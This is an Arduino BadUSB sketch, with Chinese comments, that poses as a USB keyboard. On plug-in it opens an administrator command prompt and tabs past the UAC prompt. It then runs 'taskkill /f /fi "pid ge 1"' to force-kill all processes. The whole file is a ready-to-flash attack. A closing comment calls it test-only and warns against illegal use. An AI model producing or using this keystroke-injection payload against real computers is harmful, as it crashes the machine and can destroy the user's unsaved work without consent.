#include <Keyboard.h>
void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(3000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  delay(500); 
  Keyboard.println("cmd");
  Keyboard.press(KEY_LEFT_CTRL);//ctrl键 
  Keyboard.press(KEY_LEFT_SHIFT);//shift键
  Keyboard.press(KEY_RETURN);//回车键 
  delay(500);
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_SHIFT);
  Keyboard.release(KEY_RETURN); 
  delay(500);
  Keyboard.press(KEY_TAB);//tab键
  Keyboard.release(KEY_TAB);
  delay(600);
  Keyboard.press(KEY_TAB);
  Keyboard.release(KEY_TAB);
  delay(600);
  Keyboard.press(KEY_TAB);
  Keyboard.release(KEY_TAB);
  delay(600);
  Keyboard.press(KEY_RETURN);//回车键
  Keyboard.release(KEY_RETURN);
  delay(200);
  Keyboard.press(KEY_CAPS_LOCK);//开启大小写
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("taskkill /f /fi \"pid ge 1\"");
  Keyboard.press(KEY_RETURN);//回车键
  Keyboard.release(KEY_RETURN);
  Keyboard.end();//结束键盘通讯
  
   
}
void loop()//循环
{
	//代码仅测试使用，请勿用在非法途径。
	
}